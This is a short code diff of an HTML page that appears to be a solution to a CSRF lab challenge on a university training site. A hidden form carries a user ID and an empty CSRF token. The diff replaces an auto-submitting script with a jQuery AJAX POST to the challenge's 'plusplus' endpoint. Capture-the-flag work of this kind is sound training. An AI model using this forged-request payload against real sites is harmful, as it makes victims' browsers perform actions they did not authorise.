@@ -1,9 +1,19 @@
-<form id="leForm" action="https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus">
+<form id="form" action="https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus">
    <input name="userId" value="86109c9eed773b92480275854966986d3c4901a6">
    <input name="csrfToken" value="">
 </form>
 
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script>
-   var response = document.getElementById("leForm").submit();
-   alert(response);
+   $('#form').submit(function(){
+       $.ajax({
+         url: $('#form').attr('action'),
+         type: 'POST',
+         data : $('#form').serialize(),
+         success: function(response){
+           console.log(response);
+         }
+       });
+       return false;
+   });
 </script>
